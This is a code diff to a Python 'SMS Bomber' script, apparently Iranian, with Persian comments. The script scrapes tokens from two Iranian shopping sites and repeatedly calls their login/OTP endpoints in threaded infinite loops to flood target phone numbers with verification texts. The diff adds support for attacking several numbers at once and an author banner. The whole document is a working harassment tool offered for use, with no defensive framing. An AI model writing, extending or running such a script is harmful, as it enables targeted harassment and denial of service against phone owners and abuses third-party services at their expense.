@@ -29,11 +29,9 @@ def vitrin_shop(phone):
             home_response = session.get("https://www.vitrin.shop/", timeout=10, headers={
                 "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
             })
-            home_response.encoding = 'utf-8'  # تنظیم کدک برای Termux
-
+            home_response.encoding = 'utf-8'
             if 'XSRF-TOKEN' in session.cookies:
                 return session.cookies['XSRF-TOKEN']
-            
             token_patterns = [
                 r'name="_token" content="([^"]+)"',
                 r'name="csrf-token" content="([^"]+)"',
@@ -65,29 +63,26 @@ def vitrin_shop(phone):
             "Origin": "https://www.vitrin.shop",
             "Referer": "https://www.vitrin.shop/",
         }
-
         response = requests.post(url, json=payload, headers=headers, timeout=10)
-        response.encoding = 'utf-8'  # تنظیم کدک برای Termux
-
+        response.encoding = 'utf-8'
         print(f'{g}[+] Status: {response.status_code}{a}')
         print(f'{g}[+] Response: {response.text}{a}')
-
         if response.status_code == 200:
             try:
                 response_data = response.json()
                 if response_data.get("success", False):
-                    print(f'{g}(vitrin_shop) {a}Code Sent')
+                    print(f'{g}(vitrin_shop) {a}Code Sent to {phone}')
                     return True
                 else:
-                    print(f'{r}[-] (vitrin_shop) Failed: {response_data.get("message", "Unknown error")}{a}')
+                    print(f'{r}[-] (vitrin_shop) Failed for {phone}: {response_data.get("message", "Unknown error")}{a}')
                     return False
             except ValueError as e:
-                print(f'{r}[-] JSON Decode Error: {e}{a}')
+                print(f'{r}[-] JSON Decode Error for {phone}: {e}{a}')
                 return False
-        print(f'{r}[-] (vitrin_shop) HTTP Error: {response.status_code}{a}')
+        print(f'{r}[-] (vitrin_shop) HTTP Error for {phone}: {response.status_code}{a}')
         return False
     except Exception as e:
-        print(f'{r}[!] vitrin_shop Exception: {e}{a}')
+        print(f'{r}[!] vitrin_shop Exception for {phone}: {e}{a}')
         return False
 
 # تابع ilozi
@@ -98,13 +93,11 @@ def ilozi(phone):
         home_response = session.get("https://ilozi.com/?login=true&page=2", timeout=10, headers={
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1"
         })
-        home_response.encoding = 'utf-8'  # تنظیم کدک برای Termux
-
+        home_response.encoding = 'utf-8'
         instance_id = re.search(r'name="instance_id" value="([a-f0-9]+)"', home_response.text)
         instance_id = instance_id.group(1) if instance_id else "6fb17492e0d343df4e533a9deb8ba6b9"
         digits_form = re.search(r'name="digits_form" value="([a-f0-9]+)"', home_response.text)
         digits_form = digits_form.group(1) if digits_form else "3780032f76"
-
         url = "https://ilozi.com/wp-admin/admin-ajax.php"
         payload = {
             "login_digt_countrycode": "+98",
@@ -132,30 +125,27 @@ def ilozi(phone):
             "Origin": "https://ilozi.com",
             "Referer": "https://ilozi.com/?login=true&page=2",
         }
-
         response = session.post(url, data=payload, headers=headers, timeout=10)
-        response.encoding = 'utf-8'  # تنظیم کدک برای Termux
-
+        response.encoding = 'utf-8'
         print(f'{g}[+] Status: {response.status_code}{a}')
         print(f'{g}[+] Response: {response.text}{a}')
-
         if response.status_code == 200:
             try:
                 response_data = response.json()
                 if response_data.get("success"):
-                    print(f'{g}(ilozi) {a}Code Sent')
+                    print(f'{g}(ilozi) {a}Code Sent to {phone}')
                     return True
                 else:
-                    print(f'{r}[-] (ilozi) Failed: {response_data.get("message", "Unknown error")}{a}')
+                    print(f'{r}[-] (ilozi) Failed for {phone}: {response_data.get("message", "Unknown error")}{a}')
                     return False
             except ValueError:
                 if response.text.strip() == "1":
-                    print(f'{g}(ilozi) {a}Code Sent')
+                    print(f'{g}(ilozi) {a}Code Sent to {phone}')
                     return True
-        print(f'{r}[-] (ilozi) HTTP Error: {response.status_code}{a}')
+        print(f'{r}[-] (ilozi) HTTP Error for {phone}: {response.status_code}{a}')
         return False
     except Exception as e:
-        print(f'{r}[!] ilozi Exception: {e}{a}')
+        print(f'{r}[!] ilozi Exception for {phone}: {e}{a}')
         return False
 
 # تابع ارسال ایمن سرویس‌ها
@@ -163,44 +153,65 @@ def send_service_safe(service, phone):
     try:
         service(phone)
     except Exception as e:
-        print(f"{r}[!] {service.__name__} Exception: {e}{a}")
+        print(f"{r}[!] {service.__name__} Exception for {phone}: {e}{a}")
 
 # تابع اصلی SMS Bomber
-def vip(phone, delay=0.1):
+def vip(phones, delay=0.1):
     services = [vitrin_shop, ilozi]
-    print(f"{g}Target: {y}{phone}{a}")
+    print(f"{g}Targets: {y}{', '.join(phones)}{a}")
     print(f"{g}Services: {y}{len(services)}{a}")
     print(f"{g}Delay: {y}{delay}s{a}")
     
     try:
         while True:
-            for service in services:
-                Thread(target=send_service_safe, args=(service, phone)).start()
-                sleep(delay)
+            for phone in phones:
+                for service in services:
+                    Thread(target=send_service_safe, args=(service, phone)).start()
+                    sleep(delay)
     except KeyboardInterrupt:
         print(f"{g}[+] Mission Completed!{a}")
 
-# اعتبارسنجی شماره تلفن
-def is_phone(phone: str):
-    if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
-        return re.sub(r"^(?:\+989|989|09|9)", "+989", phone)
-    return False
+# اعتبارسنجی شماره‌های تلفن
+def is_phone(phone_input: str):
+    phones = phone_input.split('-')  # جدا کردن شماره‌ها با خط فاصله
+    valid_phones = []
+    for phone in phones:
+        phone = phone.strip()
+        if re.match(r"^(?:\+989|989|09|9)\d{9}$", phone):
+            valid_phones.append(re.sub(r"^(?:\+989|989|09|9)", "+989", phone))
+        else:
+            print(f"{r}[-] Invalid Phone: {phone}{a}")
+    return valid_phones if valid_phones else False
+
+# منوی اصلی
+def main_menu():
+    print(f"""
+{y}╔════════════════════════════════════════════╗
+{g}║         SMS Bomber by M.M.]R               ║
+{y}╚════════════════════════════════════════════╝
+{g} Coded by: {r}M.M.]R{a}
+{y}══════════════════════════════════════════════
+{g} Enter phone numbers (separated by - for multiple):
+{a} Example: +989123456789-+989987654321
+{y}══════════════════════════════════════════════
+""")
 
 # نقطه ورود
 if __name__ == "__main__":
     if not check_internet():
         print(f"{r}[-] No internet connection!{a}")
     else:
-        phone = None
-        while not phone:
-            phone_input = input(f'{g}[?] Enter Phone (+98): {a}')
-            phone = is_phone(phone_input)
-            if not phone:
-                print(f"{r}[-] Invalid Phone!{a}")
+        main_menu()
+        phones = None
+        while not phones:
+            phone_input = input(f'{g}[?] Enter Phone(s) (+98): {a}')
+            phones = is_phone(phone_input)
+            if not phones:
+                print(f"{r}[-] No valid phones entered!{a}")
         
         try:
             delay = float(input(f'{g}[?] Delay (seconds) [Default=0.1]: {a}') or 0.1)
         except ValueError:
             delay = 0.1
         
-        vip(phone, delay)
+        vip(phones, delay)
